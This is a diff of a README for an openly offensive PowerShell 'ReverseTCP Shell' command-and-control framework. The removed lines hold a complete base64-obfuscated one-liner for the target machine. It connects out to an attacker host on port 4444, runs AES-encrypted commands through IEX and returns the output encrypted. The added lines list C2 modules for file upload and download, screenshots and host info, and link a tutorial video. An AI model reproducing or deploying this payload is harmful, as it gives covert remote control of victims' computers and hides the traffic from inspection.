@@ -1,20 +1,25 @@
 
-### Reverse Encrypted (AES 256-bit) Shell over TCP - using PowerShell SecureString. ###
+## ReverseTCP Shell - Framework. ##
 
-- Attacker (C2-Server Listener):
+```
 
-PS> .\ReverseTCP.ps1
+  _____                           _______ _____ _____      _____ _    _      _ _ 
+ |  __ \                         |__   __/ ____|  __ \    / ____| |  | |    | | |
+ | |__) |_____   _____ _ __ ___  ___| | | |    | |__) |  | (___ | |__| | ___| | |
+ |  _  // _ \ \ / / _ \ '__/ __|/ _ \ | | |    |  ___/    \___ \|  __  |/ _ \ | |
+ | | \ \  __/\ V /  __/ |  \__ \  __/ | | |____| |        ____) | |  | |  __/ | |
+ |_|  \_\___| \_/ \___|_|  |___/\___|_|  \_____|_|       |_____/|_|  |_|\___|_|_|
+                                                     
+                                                                                     - By: @ZHacker13                                                                                                           
 
-- Target (Client):
+ - | Modules    | - Show C2-Server Modules.
+ - | Info       | - Show Remote-Host Info.
+ - | Upload     | - Upload File from Local-Host to Remote-Host.
+ - | Download   | - Download File from Remote-Host to Local-Host.
+ - | Screenshot | - Save Screenshot from Remote-Host to Local-Host.
 
-CMD> ECHO IEX(\[string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String({JABCAGEAcwBlADYANAA9ACIAOABHAEkAWABKADMAKwBBAE0AYgAzADIASgBXAEIAZgAyADkAdQBkAGoAcgBqAHYAeQBkAHUALwB4AFgARgBFAHUAYgB0AHQAVABhAHYAWAAwAGEAbwA9ACIAOwAkAEsAZQB5AD0AKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAQgBhAHMAZQA2ADQAKQApADsAJABDAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAUwB0AHIAZQBhAG0APQAkAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAQgB5AHQAZQBzAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABSAGUAYQBkAD0AJABTAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAEIAeQB0AGUAcwAsACAAMAAsACAAJABCAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABDAG8AbQBtAGEAbgBkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAQgB5AHQAZQBzACwAMAAsACAAJABSAGUAYQBkACkAOwAkAEQAZQBDAG8AZABlAD0AJABDAG8AbQBtAGEAbgBkACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAtAEsAZQB5ACAAJABLAGUAeQA7ACQATwB1AHQAUAB1AHQAPQAoAEkARQBYACgAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUAB0AHIAVABvAFMAdAByAGkAbgBnAEEAdQB0AG8AKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwBUAG8AQgBTAFQAUgAoACQARABlAEMAbwBkAGUAKQApACkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQARQBuAEMAbwBkAGUAPQBDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJABPAHUAdABQAHUAdAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAtAEsAZQB5ACAAJABLAGUAeQA7ACQAUwBlAG4AZABCAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAEUAbgBDAG8AZABlACkAOwAkAFMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABTAGUAbgBkAEIAeQB0AGUALAAwACwAJABTAGUAbgBkAEIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABTAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAQwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsARQB4AGkAdAA=}))));Exit | PowerShell -
+```
 
-### PoC: ###
+## Tutorial: ##
 
-- Payload Execution:
-
-![alt text](/PoC1.jpg)
-
-- Analyze Encrypted Traffic:
-
-![alt text](/PoC2.jpg)
+### https://youtu.be/hiYyXv4RdD8 ###
